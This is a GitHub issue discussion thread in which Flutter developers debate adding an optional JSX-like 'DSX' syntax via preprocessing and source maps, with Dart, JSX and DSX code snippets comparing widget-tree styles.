You can simply use 2 hand written equivalent files (.dsx and .dart) to test out pre-processing capabilities like breakpoints, stepping, auto-complete, etc.

Once the tools support pre-processing with some sort of source maps, I can add that to the transpiler and be unblocked. This would also enable others to experiment to their hearts desires.

"
2944	"I don't work on Flutter, but it seems sort of unreasonable to demand certain tooling to benefit others, but then also refuse to release any early source code or examples of what you want the tooling to integrate with.

For what it's worth, I don't know of any language or toolkit that provides pre-processing hooks of any kind - probably because it's just plain not easy, there are a lot of corner cases and assumptions around the language and syntax.

If you generated source maps (https://pub.dartlang.org/packages/source_maps), I imagine getting at least some basic support in an IDE is pretty trivial, independent of Dart/Flutter. But again, this is all conjecture without knowing what your tooling does and how you'd expect it to work."
2945	"@matanlurey, supporting pre-processing via source maps is a generic mechanism that does not depend on any specific transpiler. It is functionality that is meant to support any future imaginable language. The Chrome browser/debugger supports it quite nicely and I can debug any language that transpiles to JS.

For testing you can come up with any simple kind of transpiler to show how to use source maps. For example write a trivial transpiler that generates Dart/Flutter code with a blank line between every line on the original file. (.d2 => .dart, .d2 is Dart/Flutter file, out .dart file will contain a blank line between every line in the original file).

Yes, I can work on generating source map for a testfile.
"
2946	Flutter is currently reluctant to try to please NativeScript, ReactNative, Android, Web, and other developers who accustomed to similar XML layouts. They have more important things to do, so let's disband and go to sleep.
2947	I wished Amy proponent of JSX Syntax just to spend some days really working with Flutter before continuing lamenting. I came from an Xaml based systembut quickly got used to it. Just give it a real try. 
2948	"@escamoteur
Hey, escamoteur. Do you think that I have not spent a lot of time learning flutter?
In the flutter.io/tutorials/layout/, at the end of ""Packing widgets"" section, the code that the tutorial gave does not work.
**I mentioned the issue under the flutter issue block, but no one wants to care about this.**

- Dart code: main.dart
https://raw.githubusercontent.com/flutter/website/master/_includes/code/layout/pavlova/main.dart



- Pubspec: pubspec.yaml
https://raw.githubusercontent.com/flutter/website/master/_includes/code/layout/pavlova/pubspec.yaml


- https://flutter.io/tutorials/layout/
"
2949	@JonathanSum is there any connection from your comment to the topic of this issue?
2950	"@zoechi 
escamoteur said he hopes proponent of JSX Syntax just to spend some days really working with Flutter before continuing lamenting. 
This comment shows we really have spent a lot of days working with Flutter, and the request of JSX is really our feeling from our heart. "
2951	"**Group Dart:** ""Dart syntax is way better and JSX/DSX is just not good""
**Group JSX/DSX:** ""JSX/DSX syntax is way better and Dart is just not good""

I can't be the only person to see this? Both sides make valid points in favor and against their position.  I think what is lost here is that @cbazza not only had criticism BUT ALSO DID SOMETHING ABOUT IT. Trying to bridge the gap of web devs/react/react-native and flutter in order to benefit Flutter.

And my 2 cents... As a full stack dev I have exp with a wide array of languages and approaches... JSX is one of my favorite ways to write code and I do hope there will be an alternative syntax to Darts... And i'm not saying the current syntax is bad, it's just that I prefer JSX style.

 

"
2952	"I have to disagree with this quote from the **Group JSX/DSX**

> Dart is just not good

Dart is very good and robust language, nobody is dissing the language. The discussion is not about Dart, but a synthetic layer on top of it that most UI developers already use today, and we are proposing that Flutter incorporates something like that.

- Android has XML Layouts.
- iOS has Storyboard XIB (XML)
- GTK+ has XML for Pango etc.
- Qt has QML (YAML like)
- Xamarin has XAML

Most of these frameworks and languages have UI markup languages that separate the View from the Controller logic. Then React comes along with different approach (that we are proposing here) and I think we have to agree that RN is flying right now in terms of user growth and popularity, and I may be wrong, but mainly because of JSX.

...

**Is it really so crazy proposal that we have to get this kind of feedback from Flutter team/users?**
"
2953	"@birkir and all of them bring a host of troubles Flutter does not have \o/
There is no need for another language. 
You can separate the view in Flutter as well, even with the same language."
2954	"@birkir this thread is 100% about Dart and syntax.

> The discussion is not about Dart, but a synthetic layer on top of it that most UI developers already use today, and we are proposing that Flutter incorporates something like that.

So it's not about Dart... but Flutter needs to use something besides Dart for layouts? Seems like your saying Dart isn't good enough while also claiming this has nothing to do with Dart?

I don't think it matters at this point, the Flutter team has seen this feedback (on requesting a JSX/DSX approach) and they want to continue down their original path. I do think it could be handled better but it doesn't seem like they're opposed to the community creating solutions. 

I'm happy there is another cross platform option... will Apple be the next to offer something up? And maybe they will see what so many of us like about react/react-native? IDK if they have anything cooking."
2955	"> the Flutter team has seen this feedback (on requesting a JSX/DSX approach) and they

This bug is still open because we haven't figured out what we want to do here. We're eagerly looking at the experiments (e.g. cbazza's) to see how people use them. We're planning, at some point, to provide a hook in the build system for codegen tools such as this, though this isn't something we're likely to do in the near future. On the long term we hope to use what we learn here to influence Dart's development as  a language. This could mean adding something like E4X/H4X/JSX/DSX to Dart itself. Or maybe we'll learn that nobody really ends up using it so we will do nothing. Or maybe everyone needs something different so codegen hooks and custom packages like cbazza's are the answer. We don't yet know."
2956	@jstansbe - Apple thinks that cross platform means IPhone, IPad & Mac OS. They are more likely to add turrets on top of the walled garden than build something cross platform :)
2957	"I think than if would be possible indent and format the widget in other way would be more similar to jsx and friendly for users who have experience with xml and html (almost all the android devs)...check this code in [codelab](https://codelabs.developers.google.com/codelabs/flutter/#4) 

```dart
return new Container(
    margin: const EdgeInsets.symmetric(horizontal: 8.0),
    child: new Row(
      children: <Widget>[
        new Flexible(
          child: new TextField(
            controller: _textController,
            onSubmitted: _handleSubmitted,
            decoration: new InputDecoration.collapsed(
              hintText: ""Send a message""),
          ),
        ),
        new Container(                                                 //new
          margin: new EdgeInsets.symmetric(horizontal: 4.0),           //new
          child: new IconButton(                                       //new
            icon: new Icon(Icons.send),                                //new
            onPressed: () => _handleSubmitted(_textController.text)),  //new
        ),                                                             //new
      ],
    ),
  );

```

check this dart to jsx code

```jsx

<Container margin="""">
   <Row>
       <Flexible>
            <TextField   controller=""""
                                onSubmitted=""""
                                decoration="""">
                 <OtherWidget></OtherWidget>
               
            </TextField>
        </Flexible>
   </Row>
</Container>

```

and compare with this other format more htmlish

```dart

  return Container(margin: const EdgeInsets.symmetric(horizontal: 8.0), child:
            Row(children: <Widget>[
                Flexible(child:
                    TextField(controller: _textController,
                              onSubmitted: _handleSubmit,
                              decoration: new InputDecoration.collapsed(hintText: ""manda un mensaje""),),
                    ),
                Container(margin: const EdgeInsets.symmetric(horizontal: 4.0),child:
                     IconButton(icon: Icon(Icons.send),
                               onPressed: ()=>_handleSubmit(_textController.text),),)
              ],
            )
    );

```

this is a bit more similar and now you only need view from left to right to notice the different widgets similar to html/xml/jsx

the element (widget) attributes has more indentation than the new widgets, so this makes more clear could understand and check the code

would be great if I could have automatic indentation for this format on the different ides, right now I do this by hand...."
2958	"After reading all of the comments here and privately discussing with my friends(native mobile apps developers,java/kotlin/objective-c/swift guys),My observation:

People are asking for two things,
*  __Better readability and easier writting__. Deep nesting mixed with some syntax noises(parentheses, semicolon, `new`, `child`, `children`) is annoying in current way of coding.
*  __Seperate style/design from code__.  Visual seperation is good for reading(Differentiating the style from imperative code by a glance)  and a real seperation is good for tooling(e.g, IDE with Layout Editor) .

There are also mainly two groups with different opinions,
* Improving current syntax without introducing another complexity to solve the problem. 
There have already been  some improvements in this direction.For instance,optional `new`,`const` in Dart 2.0 and proposed `virtual ""closing tag"" comments` feature.
* Introducing extra markup languages(JSX like or XML like) to solve the problem. 

You can not easily conclude which one is better at present. So just let the community do their experiments first and make the final decision(accept or reject) later.
"
2959	@hooluupog virtual closing tag comments already work in IntelliJ, AS, VSCode since a while
2960	"@Hixie 

> This bug is still open because we haven't figured out what we want to do here. We're eagerly looking at the experiments (e.g. cbazza's) to see how people use them. 

People can't use my experiments because it can't be seamlessly embedded right now into Flutter; so it remains an outside/online experiment where people can only see the potential.

> We're planning, at some point, to provide a hook in the build system for codegen tools such as this, though this isn't something we're likely to do in the near future. On the long term we hope to use what we learn here to influence Dart's development as a language. 

Can you be more specific timewise for when can we expect some movement on the build system changes to support preprocessing? Are we talking a month, a quarter, six month, a year, 2 years, a decade, a jubilee, etc

> This could mean adding something like E4X/H4X/JSX/DSX to Dart itself. 

Please read the top paragraphs of the JSX spec to see that there is no need to change the Dart language since JSX/DSX has no semantics, and it is not meant to be implemented by engines or incorporated into languages. It is intended to be used in a preprocessor (transpiler). DSX could be used with Flutter & on Web to make React-Dart exactly like React.js but with the Dart language.

https://facebook.github.io/jsx/

> Or maybe we'll learn that nobody really ends up using it so we will do nothing. 

How can people use something that is not available for them to use in the first place and then conclude that nothing needs to be done because people are not using it ? This reminds me so much of Melissa McCarthy's Sean Spicer impersonation on SNL about the 'travel ban'... 'circular using of the word' :)

https://www.youtube.com/watch?v=1Dvo6EHEJQE&t=48s

> Or maybe everyone needs something different so codegen hooks and custom packages like cbazza's are the answer. We don't yet know.

Preprocessing capabilities are badly needed to enable experimentation. Without it nothing moves forward and you won't learn anything new.

"
2961	"> People can't use my experiments 

I think you underestimate how willing people are to try things, even when they're not fully polished. For example, someone could easily write a shell script that wraps `flutter run` to do the preprocessing first, then call `flutter run`. I have a script myself that wraps hot reload to do something similar (I run the analyzer first, then only if it passes do I send the hot reload signal to the `flutter` script).

> Can you be more specific timewise for when can we expect some movement on the build system changes 

Not really (see e.g. <https://en.wikipedia.org/wiki/Forward-looking_statement> for why it might be difficult to make such statements), but probably not in the coming weeks.

> there is no need to change the Dart language 

That's quite possible, indeed. I'm just saying that based on these experiments, we may reach any number of conclusions, all the way from ""do nothing"" to ""add radical new features to the language syntax"" and anything in between. The point being, we haven't made any decisions yet, and are very open to learning what needs to be done based on all these discussions and experiments."
2962	Add JSX to backlog and let it compete, gladiator-style, with the million-plus-one other urgent requirements?
2963	"React is written for the web and thus needs a simple solution for writing HTML. JSX didn’t become popular because it’s the best solution for writing UIs, but because it’s the best solution for writing HTML.

Flutter doesn’t have that constraint, so we shouldn’t settle with a mediocre, verbose solution for the wrong reasons.

If we want to reduce verbosity I’d rather take inspiration e.g. from Anko (https://github.com/Kotlin/anko/wiki/Anko-Layouts). There you can define new local variables anywhere and use normal for-loops to dynamically construct the list of children, which can make the code easier to follow. Also, the LayoutBuilder would become easier on the eye since each nesting level is already a lambda function anyway (no need for passing an extra builder lambda). Anyway, this is just for inspiration and I don’t think Flutter should copy that 1:1."
2964	"> React is written for the web and thus needs a simple solution for writing HTML. JSX didn’t become popular because it’s the best solution for writing UIs, but because it’s the best solution for writing HTML.

React Native is not web development nor it uses HTML. Ask experienced React developers (or fully read this and the other JSX thread) and you will see that JSX is considered by many React developers as the best way for writing UIs.

> There you can define new local variables anywhere and use normal for-loops to dynamically construct the list of children, which can make the code easier to follow. 

This statement clearly demonstrates that you don't know JSX. JSX (as in DSX) uses all programming constructs (for-loops, etc) from the hosting language (Javascript/Dart).

This ticket is only interested in JSX-like functionality, for other approaches (like Anko) please create your own ticket for discussion there.

"
2965	"> React Native is not web development nor it uses HTML. Ask experienced React developers (or fully read this and the other JSX thread) and you will see that JSX is considered by many React developers as the best way for writing UIs.

React came out long before React Native. The original design of JSX is based on Rendering HTML, not native UIs. Nobody has been able to show a single convincing argument for what JSX does better. By comparing

```dart
new Scaffold(
  appBar: new AppBar(
    title: new Text(widget.title),
  ),
  body: new Column(
    child: ...,
  ),
)
```

to

```jsx
<Scaffold
    appBar={<AppBar title={<Text>{widget.title}</Text>} />}
  >
  <Column>
    ...
  </Column>
</Scaffold>
```

you haven't done an up-to-date comparison and you're simply putting more stuff one a single line. You must compare it to:

```dart
Scaffold(
  appBar: AppBar(title: Text(widget.title)),
  body: Column(
    child: ...,
  ),
)
```

Notice how all the ugly `{<{<>} />}` and closing `</...>` tags are gone.

> This statement clearly demonstrates that you don't know JSX. JSX (as in DSX) uses all programming constructs (for-loops, etc) from the hosting language (Javascript/Dart).

No, you can’t use if statements or for-loops (or switch or any other statement) within JSX:
```jsx
function render(data) {
  return (
    <div>
      // This is impossible
      let total = 0;
      for (let item of data.list) {
        total += item.value;
        <div>{ total }</div>
        <div>{ item.name }</div>
      }
    </div>
  )
}
```

Only expressions are allowed. So you must use conditional operators (`c ? x : y`, which makes `else if` very ugly) and `Array.map` etc. (which can also be very ugly) or move parts of your code to the top of the render function or into a separate helper function. It’s the same with Flutter, of course. Anko doesn’t have this limitation and makes writing (some) UI code more natural.

I think in a discussion about introducing JSX it’s quite valid and necessary to ask if that’s actually the best solution or if we can find something better. Otherwise we’ll waste resources on the wrong tasks."
2966	"> React came out long before React Native. The original design of JSX is based on Rendering HTML, not native UIs. 

The original design of JSX is about familiar way of creating/manipulating tree structures which specially show up when doing UI work; think component hierarchies (https://facebook.github.io/jsx/) which show up in web development, native development, any UI development, etc.

> Nobody has been able to show a single convincing argument for what JSX does better.

That's the point, we are not looking to replace the current way, we are looking to add an alternative way that is familiar to React developers. 

Your Anko proposal would be familiar to Android Kotlin developers so go ahead and propose a spec that works with current Flutter hierarchy in a separate ticket. Once I see (or try an online version of your spec) I would be able to see if it can generate/interoperate with current Flutter widget hierarchy.

> No, you can't use if statements or for-loops (or switch or any other statement) within JSX:

Not that I recommend you doing this but it is possible: create an anonymous function and call it.
```js
function render(data) {
  return (
    <div>
      { ()=>{
        // This is *not* impossible
        let divs=[];
        let total = 0;
        for (let item of data.list) {
          total += item.value;
          divs.push(<div>{ total }</div>);
          divs.push(<div>{ item.name }</div>);
        }
        return divs;
      }() }
    </div>
  )
}
```

> I think in a discussion about introducing JSX it's quite valid and necessary to ask if that's actually the best solution.

There is no such thing as the best solution, it's all about having choice, having the choice of using something familiar that maps directly to Flutter widgets and adds no overhead. 


"
2967	"By the way, try the following on my online transpiler at:
https://spark-heroku-dsx.herokuapp.com/index.html

```jsx
@<Scaffold>
  <appBar:AppBar>
     <title:Text [widget.title]/>
  </appBar:AppBar>
  <Column>
    {kids}
  </Column>
</Scaffold>@
```

and you get:

```dart
--------new Scaffold(
--------  appBar: new AppBar(
--------    title: new Text(
--------      widget.title,
--------    ),
--------  ),
--------  child: new Column(
--------    child: kids,
--------  ),
--------);
```

DSX is similar to JSX but for Dart & Flutter so it has features of its own which are described on the link above.
"
2968	when I see this, I get flashbacks from xml layouts from Android.. I don't think it's a good idea to implement this. Now that you dont even have to write `new` and `const` it even looks better.
2969	"@charafau Can you share an example/img/link of, ""xml layouts from Android"" you're referring to?"
2970	"No, @wkornewald. If ""JSX didn’t become popular because it’s the best solution for writing UIs, but because it’s the best solution for writing HTML"", why does React still uses JSX for building a mobile app and desktop app? Even your Github desktop application, Walmart cross-platform mobile app, and Tesla app, and Skype are also built by RN. 


React does not put a for loop in the JSX tag because the concept of React is about the component. The upper part is the logic and the below part is the JSX, and It is always like this. Everything is separated into many components and connected together into a large component.


**In fact, most of the people here who against JSX  can only guess  JSX is some kind of HTML, XML, or a less verbose solution. People should understand why people love to build an app either with React and  why JSX is so important on this.** 
"
2971	"@JonathanSum 

> most of the people here who against JSX can only guess JSX is some kind of HTML

I think it's rather because there were no other arguments in favor of JSX/DSX other than personal preference. That's fine of course as discussed already above, but please don't imply people are against JSX because they don't understand it, when there is no list of good factual arguments that show where JSX is better than plain Dart. "
2972	"> I think it's rather because there were no other arguments in favor of JSX/DSX other than personal preference. 

Not really, many were given before, just read fully both threads. I did mention these 2 things before:
(1) No more 'child' & 'children' stuff
(2) easy for 3rd party tools to manipulate (parse, analyse and regenerate)

With  (2) you can enhance the markup to do things not possible with just Dart; for example DSX's spread operator or generating many function parameters from a smaller set.

Others have provided lots of good points but I am not digging it up for you ;)
"
2973	"(1) as mentioned such things can also be changed/improved in Dart and there were already discussions. This just won't happen before Dart 2 release. 
Just assuming that DSX allows all kind of new features and Dart doesn't isn't really a fair argument in my opinion.
(2) I'm pretty sure this can as well done with Dart and there is of course already a parser for Dart.  

> Others have provided lots of good points but I am not digging it up for you ;)

There is no need to dig them up for **me**, but this comes up frequently and you might be able to convince others that you actually have valid arguments. 
I followed the discussion and can't remember good factual arguments and that might be the same for others. If you summarize them you can just post a link to the next that questions that.

As discussed before I can accept personal preference as a valid argument, but if you claim to have lots of factual arguments as well, then I think it's valid to ask to get them pointed out.

"
2974	"You keep asking for 'valid arguments' and when they are given you dismiss them as 'future Dart will have this' or 'this is not a valid argument'. 

The fact is that right now Dart/Flutter has noisy child/children everywhere when building a widget and XML/DSX doesn't. Right now it is a very valid argument for using DSX to remove this child/children noise. Can you just accept that as a valid argument? (just because you say Dart will have that in the future, it doesn't make the argument invalid).

It is also a fact that parsing XML is much simpler than parsing the full Dart language *and* every language out there has an XML parser, whereas only Dart has a full and complete Dart language parser. Can you see that this is also a valid argument? 

There are lots of valid arguments, they are just not valid for you and that's why I stopped arguing about it. If people are interested in what was said, just read the 2 threads on JSX fully. I have no interest in convincing you to use DSX, you are happy with plain Dart so be it; I am not.
"
2975	"Arguments for an optional DSX syntax:

1) Onboard and attract more developers coming from React (web and native)
2) Better experience of porting React Native components into Flutter widgets
3) Drives consistency of child/children properties in widgets
4) Code readability (opinionated argument)
5) View logic linting separate from the dart linting
6) Opens up a world for UI building tools
7) Opens up the ecosystem for pre processors"
2976	DSX +1, 
2977	DSX +1
2978	"DSX +1

Would've loved to write a bunch of pro/cons, but by having read all these comments, I feel like I'm just gonna repeat everything over and over.
Stop being so naive and ignorant, nobody says you'll be FORCED to write UIs using DSX, it's simply an option (better alternative).
There's a reason you can write JS in 101203103 different ways."
2979	"Well, there's always the option writing an analyzer plugin that parses DSX and converts them into regular Dart function calls, so that the compiler doesn't have to do any extra work.

The real question is whether analyzer plugins apply within the context of the compiler.

If you ask me, DSX should only be opt-in, ideally through some sort of plug-in. I think it's extremely unnecessary to add it to the language itself, as then server-side and Web users of Dart have to adapt to the changes, not just Flutter users. The vast majority of code written in Dart doesn't even remotely need any XML syntax, so enforcing it on everybody is a bad decision.

TLDR; if you want DSX that bad, write an analyzer plugin and bring it to Dart yourself. The Internet will love you, you'll get thousands of Github stars, and you'll feel just like it's React. Win-win.

P.S. I'll even race you to do it"
2980	"> Well, there's always the option writing an analyzer plugin that parses DSX and converts them into regular Dart function calls, so that the compiler doesn't have to do any extra work.

There is currently no way in the dart language to implement this without any hacks (think race conditions, recursive imports and stuff). This needs to be integrated at level where everything will work as expected, hot reloading, static analysis, etc.

> If you ask me, DSX should only be opt-in, ideally through some sort of plug-in. I think it's extremely unnecessary to add it to the language itself, as then server-side and Web users of Dart have to adapt to the changes, not just Flutter users. The vast majority of code written in Dart doesn't even remotely need any XML syntax, so enforcing it on everybody is a bad decision.

If you read the thread, that has been the idea from day one. We just want the support from flutter/dart to make an transpiler.

> TLDR; if you want DSX that bad, write an analyzer plugin and bring it to Dart yourself. The Internet will love you, you'll get thousands of Github stars, and you'll feel just like it's React. Win-win.

Read the thread, this has already been done by @cbazza  (analyzer plugin isn't gonna cut it)

https://github.com/flutter/flutter/issues/11609#issuecomment-388484681

> P.S. I'll even race you to do it

Great! Just even a theory of how this would work would be interesting to see."
2981	SGTM. Guess we’re all waiting on some sort of pre-processing support, then.
2982	"I prefer builder syntax than passing parameters through constructor
```dart
@override
Widget build(BuildContext context) {
    return container()
      .height(56.0)
      .padding(8.0)
      .decoration(BoxDecoration(color: Colors.blue[500]))
      .child(text(""Hello world!"")
                   .style(...)
                  .build());
}
```
like in https://fblitho.com/

```java
Text.create(context)
    .text(""Hello World"")
    .textSizeDip(50)
    .build();
```"
2983	"DSX +1
"
2984	"I get the arguments for JSX, but I think there are just as many folks (self included) who hate the thought of jamming XML into a programming language. It just feels wrong  (but I *totally* get that others don't feel the same way).

Given that it is next to impossible to take features away once implemented, I'd suggest the pre-cautionary principle.  Let's see how some of newer Dart 2 syntax features play out before committing to a substantial change to the way Flutter apps are built."
2985	"@wstrange 
I can understand you. I used to be against JSX and mixing js with xml/html.... then I tried it. After a few months spent with react, I fell in love with JSX. Two killer advantages are:
1. no new syntax and utilities
2. no more passing of variables, functions etc."
2986	"@wstrange,
> Given that it is next to impossible to take features away once implemented,

That's not a given, who would had thought that Google would remove MathML from Chrome? 

>  Let's see how some of newer Dart 2 syntax features play out before committing to a substantial change to the way Flutter apps are built.

It is not a change to the way Flutter apps are build at all, it's just an alternative way that doesn't change the current way, and most important it is simply a different syntax to the class library. A simple transpiler does the mapping without needing any information from Flutter classes so it works just fine for anybody's code, as well as Flutter now and in the future.

@Bessonov,

Yes, you don't know React until you spend a few months working with it and then you realise how phenomenal a library it is for dealing with component hierarchies.

"
2987	@cbazza I could say exactly the same thing about Flutter. Spend some weeks using it and you won't miss JSX. 
2988	"The reaction tells us everything.

As now, `+1` nearly double times  `-1`"
2989	"@escamoteur, 
Yes, very fair statement to say but I have spent a lot of time with Flutter and I can certainly see the value DSX would add to it. As @leedstyh has noticed, DSX fans lead the race by almost 2-to-1 which is pretty amazing considering people in this forum are Flutter people."
2990	"I have a question:

When using DSX syntax, we implicitly assume that the nested child/children is of type Widget. What if we want to explicitly state that we want nested child/children be a specific sub-type of Widget?

for example, when I want children of my custom widget only accept a list of Container, I can annotate the children with `List<Container>` and IDE will give an error as soon as I put anything different from Container. As I’m aware of there is no way to enforce type safe like this when using dsx. Maybe we can have some error when the app compiles though but I think the error raise when I’m typing is still a better experience.

I think we should give everyone some time to try out and get familiar with flutter way to declare UI, at least after v1 release. Then we could have a better look at this feature."
2991	"@sandangel ,

Very good catch !!! I bowl my virtual hat to you. My initial prototype has had some holes in it from the beginning that I was aware of and just waiting to people to find them and come forward. I was just hoping people were interested in discussing the technology instead of fighting over it.

The solution I have to this is to provide the array type as another parameter on the namespace. As the namespace is getting large, we can set the short form for 'children' be '*'.

In Example 2 at https://spark-heroku-dsx.herokuapp.com/index.html, if actions were an array of 'Container' instead of default 'Widget', it would look like the following alternatives:

```dart
        <actions:children:Container>
            <IconButton 
                icon={new Icon(Icons.search)}
                tooltip='Search'
                onPress={null}
            />
        </actions:children:Container>
```

```dart
        <actions:*:Container>
            <IconButton 
                icon={new Icon(Icons.search)}
                tooltip='Search'
                onPress={null}
            />
        </actions:*:Container>
```





"
2992	"hi @cbazza , thank you for your response.

I'm wondering about your solution. Are we misusing the xml namespace as described in [w3shool-XML Namespaces](https://www.w3schools.com/xml/xml_namespaces.asp)?

As it states that namespace is primarily used to solve the naming conflict in XML document.

So when someone reads the above XML, they might think that you are declaring a Container tag under the namespace 'children' of the namespace 'actions', not you are enforcing every nested children must be a Container. It does confuse me when I first read your propose syntax without reading the above explanation. 

Could we have something better?"
2993	"DSX is not XML, it's XML-like so it doesn't need to follow XML semantics, kind of like Angular template language ;) Anyways, I am always open to better alternatives or suggestions and would love to have a discussion here.
"
2994	"Coming From React-native, I first supported JSX like implementation, and didn't like the nested objects, but I am beginning to enjoy OOP and see everything as an Object! 

For the people coming from React-native, I highly recommend this plugin! https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer"
2995	"@clarktank 
Can you expand on your exp with react-native(JSX), Flutter(OOP), and your journey from one to the other?"
2996	"@cbazza I think angular template syntax does follow xml semantics and as I'm aware of there is no conflict use case between angular syntax and xml document.

In typescript, we have support for [generic component](https://github.com/Microsoft/TypeScript/pull/22415). 
So I think we could have something like this:
```xml
<children<Container>>
  <Container/>
</children>
```
But again, the generic component is used for type checking the property input. I don't know if the above syntax has a right semantic meaning in this use case. 

I really feel that Flutter team have created the current API specifically for the new way to declare UI they supposed that's better than JSX and any effort we are trying to bind JSX syntax to the current API just make it look unnatural/uncomfortable to use.
"
2997	">The reaction tells us everything.
>
>As now, +1 nearly double times -1

This doesn't mean anything.

Except those who are watching all Flutter issues double the one that land on this issue because they are already used to JSX (and are explicitaly looking for it). So this rather means _the people that want a JSX-like experience double the people watching all issues that have voted -1_. (imho a part of the people voting +1 haven't even really tried flutter)"
2998	"@sandangel ,

> I think angular template syntax does follow xml semantics and as I'm aware of there is no conflict use case between angular syntax and xml document.

Sure but JSX doesn't use namespace so it is not a XML feature of interest.

```xml
<children<Container>>
  <Container/>
</children>
```

Since you split the 'children' out of action into it's own tag, kind of reminds me of the new Fragment tag of React.  It's a balance between verbosity and conciseness that's for sure.

> I really feel that Flutter team have created the current API specifically for the new way to declare UI they supposed that's better than JSX and any effort we are trying to bind JSX syntax to the current API just make it look unnatural/uncomfortable to use.

There is nothing new in the way Flutter declares UI in code, Perhaps using DSX is unnatural/uncomfortable to you but to JSX developers it is not. JSX/DSX is perfect for Flutter, it fits like a glove and if you don't like gloves go bare handed ;)

@a14n ,

> This doesn't mean anything.

it sure does !!! you can argue with 'feeling', 'thinking', 'suspect', 'imho', 'opinion' but this is data, a concrete data point. If the data is useless it shouldn't be collected. I guess the data is useless because it doesn't paint your picture.




"
2999	"@cbazza I mean when we're trying to answer the question I have above about enforcing sub-type of widget for child/children, I feel that Dart code is doing a better job than JSX.

> DSX is not XML, it's XML-like so it doesn't need to follow XML semantics


> Sure but JSX doesn't use namespace so it is not a XML feature of interest.

I'm not sure but I have read some of your comments above and I think you have mentioned JSX/XML node interchangeably. Anyway, personally I think using namespace as a solution is not ideal. 

Just compare 

```xml
<actions:children:Container>

</actions:children:Container>

``` 

and 

`actions: <Container>[]` 

syntax."
3000	"@sandangel,

Yes, the tagging syntax is more verbose for this case and that's why I mentioned the short form for children being '*'. Anyways, this case is the exception and not the rule. Most of the time you don't need to even specify 'children', let alone 'Container'; but the functionality needs to be there to cover all possible use cases.


 "
3001	"@a14n vote is vote, it sure means.

I respect your feeling, maybe it's true. But even with a reverse ratio (1 to 2), that still means 33% user base. Can you say 33% is a small share?

>  people that want a JSX-like experience

Yeah, some people are watching. This also means _lack of JSX-like is one of the reasons prevent people from choosing flutter_.

Flutter aims at more developers, not only ones read all issues.
"
3002	"@jstansbe 
I am a self-taught programmer, and like most self-taught guys, I started with Javascript.
Then I started to learn React and React-Native. I think in recent years, specially after ES6, OOP style was added to Javascript. 

So people like me aren't used to OOP style of programming. Even though React native `Component `are classes just like `Widgets` in Flutter.  

JSX kind of hides the pure OOP picture. Basically, it hides what happens under the hood. Note: React was designed for web developers, and web developers are used to html syntax. That is why JSX is so popular, among web developers.

Personally, I think pure OOP makes more sense for big projects.  
"
3003	"
@clarktank,

When discussing computer languages you have to be aware of:
(1) Syntax - the characters and words that make up the language
(2) Semantics - the meaning of those characters and words

For example, function calls in many languages look like the following (i.e. have the following syntax):

```javascript
a = someFunction(param1, param2)
```

Imagine now that another language decides to use square brackets instead of rounded brackets for function calls; it would look like the following:

```javascript
a = someFunction[param1, param2]
```

The thing here is that the syntax is different but the semantics are the same. I mean both are basically doing function calls but with a different syntax.

> JSX kind of hides the pure OOP picture. Basically, it hides what happens under the hood.

Not true at all. JSX/DSX is just a different syntax to exactly the same thing (the semantics are the same). In the case of JSX, XML tags just create React Components (just like you can do it in Pure Javascript). In the case of DSX, XML tags just create Flutter Widgets (just like you can do it in Pure Dart). The syntax is different but it generates exactly the same thing so it is identical under the hood.

> Note: React was designed for web developers, and web developers are used to html syntax. That is why JSX is so popular, among web developers.

JSX is popular because it is a great way to manage component tree hierarchies, whether for web, mobile or any UI development. Notice in the code below you don't know if the dropdown component is for web or mobile for example. 

https://facebook.github.io/jsx/

```javascript
// Using JSX to express UI components.
var dropdown =
  <Dropdown>
    A dropdown list
    <Menu>
      <MenuItem>Do Something</MenuItem>
      <MenuItem>Do Something Fun!</MenuItem>
      <MenuItem>Do Something Else</MenuItem>
    </Menu>
  </Dropdown>;

render(dropdown);
```

> Personally, I think pure OOP makes more sense for big projects.

How is that? (considering that using JSX/DSX or Pure Javascript/Dart generates exactly the same thing under the hood).
"
3004	"@cbazza
 
I used react-native for almost one year and had no idea JSX elements are Objects that are being instantiated, until I started with Flutter/Dart. From my perspective, it does hide the OOP picture, even though as you said it semantically does the same thing under the hood!

In large application, JSX could also get as ugly as heavily nested objects. So syntactically, I would rather stay consistent than introducing another style which could be as confusing.
 "
3005	"@clarktank,

> In large application, JSX could also get as ugly as heavily nested objects. So syntactically, I would rather stay consistent than introducing another style which could be as confusing.

For me having it look different than the rest of the code is actually a benefit. 
"
3006	"(I apologize in advance for the wall of text.)

As someone who hasn't used either React-Native or Flutter long enough to consider myself a definitive source whether raw Dart or JSX/DSX is ""better"", this issue thread has been rather fascinating to read. There are a couple things that I would like to put my $0.02 down on though.

To begin, I find myself agreeing with various people on the nature of what JSX actually is and how it benefits developers. First and foremost, JSX was designed as a form of ""dynamic HTML"" that could be inlined into existing Javascript code. It's indispensable for JS-based web platforms like React in that it enables web developers to cleanly and efficiently interact with the DOM without having to wrestle with the god-awful native way (or the only-slightly-better jQuery way). Also, by its very nature, JSX encourages UI development that can be easily decoupled from the underlying data, promoting a well-organized project structure. In that environment, JSX is a tool to enable greater productivity, and I feel that it would be virtually impossible to argue with that.

How that paragraph relates to React-Native is that, even though it is a mobile-development platform, it is directly descended from React. As such, nearly all of the syntax and paradigms were still originally created with web-development in mind. That is by design - RN's whole shtick is that you can ""create cross-platform mobile apps using React"", so it's _supposed_ to feel like web development when using it.  RN apps are also predominantly written in Javascript, so the inclusion of JSX is a natural one. JSX helps RN development for nearly all the same reasons that it helps in web development. (I really think that this is one big reason that, in RN at least, the JSX approach is used so much more frequently than the native approach. RN itself just _feels_ like a web platform, so the more web-natural approach is inevitably going to become predominant.)

Flutter, on the other hand, has no such design philosophy. It is intended to be a purely native cross-platform solution, and though it states that it was inspired by React-Native, it writes a lot more like a native desktop or mobile app than a web app. It also runs using Dart and not Javascript, which from the standpoint of integrating something like JSX is a major consideration. For one, while the JS DOM functions can horribly verbose (both because of the function's design and the JS language itself), Dart as a language is much more facilitating of clean UI-declarative code while Flutter for the most part does a good job of keeping UI constructors concise. For another ([as @sandangel pointed out](https://github.com/flutter/flutter/issues/11609#issuecomment-403298346)) Dart is a statically-typed language, so the nature of JSX being designed for a dynamically-typed language like JS is going to run into snags in cases where, for example, a UI constructor requires a Widget of a specific type, the only solution to which just adds to the verbosity. Personally, it feels like a solution that, over time, will inevitably result in a DSL that has gotten bloated and difficult to maintain as it has to account for a growing number of use cases inherent in a system that it wasn't intended to be used for.

